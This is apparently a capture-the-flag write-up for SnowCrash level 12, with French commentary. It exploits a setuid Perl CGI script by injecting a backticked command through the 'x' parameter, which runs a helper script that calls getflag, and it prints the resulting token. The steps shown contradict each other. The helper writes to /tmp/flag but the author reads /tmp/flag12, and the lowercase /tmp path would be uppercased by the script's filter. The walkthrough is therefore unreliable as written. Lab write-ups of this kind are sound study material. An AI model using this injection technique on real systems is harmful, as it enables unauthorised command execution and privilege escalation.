# Level 12

</br></br>

## check file level 12
```zsh
level12@SnowCrash:~$ ls -al
total 16
dr-xr-x---+ 1 level12 level12  120 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level12 level12  220 Apr  3  2012 .bash_logout
-r-x------  1 level12 level12 3518 Aug 30  2015 .bashrc
-rwsr-sr-x+ 1 flag12  level12  464 Mar  5  2016 level12.pl
-r-x------  1 level12 level12  675 Apr  3  2012 .profile
level12@SnowCrash:~$ ./level12.pl 
Content-type: text/html

..level12@SnowCrash:~$ cat level12.pl 
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")));
```
Étant donné que c'est un CGI, il est nécessaire de créer un script

</br></br>

## make CGI file
```zsh
level12@SnowCrash:~$ vim /tmp/GETFLAG
level12@SnowCrash:~$ cat /tmp/GETFLAG
#!/bin/bash
getflag > /tmp/flag
level12@SnowCrash:~$ chmod +x /tmp/GETFLAG
```
dans le pl script, le nom de fichier est changé en mascule.
donc, on doit créer le fichier en mascule et avec "backtick".
en tour cas, backtick et systemcall dans le code ou script,
on peut executer la commande

</br></br>

## execute
connect to 
> http://192.168.56.101:4646/?x=`/tmp/GETFLAG`

```zsh
level12@SnowCrash:~$ cat /tmp/flag12
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
level12@SnowCrash:~$ su level13 
Password: 
level13@SnowCrash:~$ 
```